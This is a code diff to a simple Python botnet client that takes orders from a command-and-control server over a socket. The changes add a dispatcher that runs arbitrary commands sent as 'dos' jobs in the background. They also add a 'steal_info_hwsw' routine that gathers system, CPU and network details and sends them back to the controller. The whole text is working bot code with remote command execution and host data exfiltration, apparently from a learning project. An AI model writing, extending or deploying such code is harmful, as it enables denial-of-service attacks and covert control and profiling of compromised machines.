@@ -1,19 +1,31 @@
 import socket
 import subprocess
+import json
+
+CURRENT_PROCESSES = []
+
 
 def get_my_ip():
     cmd = ['hostname', '-I']
-    proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
-    o, e = proc.communicate()
-    my_ip = o.decode('ascii')
+    my_ip = exec_cmd(cmd)
     return my_ip[:-2]
 
-def exec_dos(cmd):
-    cmd = cmd.split()
+def exec_cmd(cmd, wait=False):
+    if wait:
+        proc = subprocess.Popen(cmd, shell=False, stdin=None, stdout=None, stderr=None,close_fds=True)
+        CURRENT_PROCESSES.append(proc)
+        return 1
     proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
     o, e = proc.communicate()
-    res = o.decode('ascii')
-    return res
+    result = o.decode('ascii')
+    return result
+
+def steal_info_hwsw():
+    return {
+        "uname": exec_cmd(["uname", "-a"]),
+        "lscpu": exec_cmd(["lscpu"]),
+        "network": exec_cmd(["netstat", "-i"])
+    }
 
 def handle_irc_connection(server_socket):
     conn, address = server_socket.accept()
@@ -25,14 +37,21 @@ def handle_irc_connection(server_socket):
             break
         data = str(data)
         print("from C&C: " + data)
-        print(exec_dos(data))
-
+        action_type, action = data.split(":")
+        if action_type == "dos":
+            print("[+] Executing dos as C&C asked")
+            exec_cmd(action.split(), wait=True)
+        elif action_type == "hwsw":
+            print("[+] Extracting info on hw and sw info as C&C asked")
+            infos = steal_info_hwsw()
+            conn.send(json.dumps(infos, indent=2).encode('utf-8'))
     conn.close()  # close the connection
 
     if data == 'exit':
-        return handle_connection(server_socket)
+        return handle_irc_connection(server_socket)
     # else 
     print("[-] Killing bot")
+    [proc.kill() for proc in CURRENT_PROCESSES]
     return 1
 
 def set_up_irc():
